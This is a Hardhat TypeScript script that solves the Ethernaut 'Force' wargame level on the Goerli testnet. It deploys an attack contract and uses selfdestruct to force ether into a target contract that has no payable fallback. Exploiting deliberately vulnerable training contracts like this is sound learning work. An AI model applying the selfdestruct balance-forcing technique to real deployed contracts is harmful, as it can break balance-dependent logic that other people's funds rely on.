import { ethers } from "hardhat";

const attackForce = async () => {
    // change contract addresses here.
    const forceAddress = process.env.FORCE!; //type "await contract.address()" in ethernaut console
    const args: [] = [];
    const deployer = process.env.PRIVATE_KEY || "";
    // [deployer] = await ethers.getSigners();

    // Don't touch below 🚀
    // You can use seldestrcut contract to send ETH to a contract with no receive function or fallback()
    // Additional read to understand more on selfdestruct:
    // https://docs.soliditylang.org/en/v0.6.0/units-and-global-variables.html#contract-related

    // deploying attack contract here
    // const deployed = await deployContract(hre, "EternalKing", args);
    // alternative below
    console.log("Deploying attack contract AttackForce...");
    const attack = await (await ethers.getContractFactory("AttackForce", deployer)).deploy();
    console.log(attack);
    console.log(`Attack contract deployed to ${attack.address}`);
    // experimantal verify below
    // if (eternalKing.address){
    //     console.log("Verifying contract...");
    //     try {
    //         await run("verify:verify", {
    //             address: eternalKing.address,
    //             constructorArguments: args,
    //         });
    //     } catch (e: any) {
    //         if (e.message.toLowerCase().includes("already verified")) {
    //             console.log("Already verified!");
    //         } else {
    //             console.log(e);
    //         }
    //     }
    // }

    // typing all commands in console below
    const provider = ethers.getDefaultProvider("goerli");
    const oldContractBalance = ethers.utils.formatEther(await provider.getBalance(forceAddress));
    console.log(`Force contract balance is: ${oldContractBalance} ETH`);
    console.log("Sending '0.0001' ETH to attack contract...");
    const tx1 = await attack.deposit({ value: ethers.utils.parseEther("0.0001") });
    const tx1Receipt = await tx1.wait();
    console.log(tx1Receipt);
    console.log("Sending ETH to Force contract by selfdestruct attack contract...");
    const tx2 = await attack.destruct(forceAddress);
    const tx2Receipt = await tx2.wait();
    console.log(tx2Receipt);
    console.log("Rechecking Force contract balance");
    const newContractBalance = ethers.utils.formatEther(await provider.getBalance(forceAddress));
    console.log(`Force contract balance is: ${newContractBalance} ETH`);
    if (newContractBalance > oldContractBalance) {
        console.log(
            "Congrats, Level Passed!Successfuly transfered ETH to Force Contract. Submit to ethernaut..."
        );
    } else {
        console.log("Failed to transfer ETH to Force Contract, review code above and try again...");
    }
};

attackForce()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
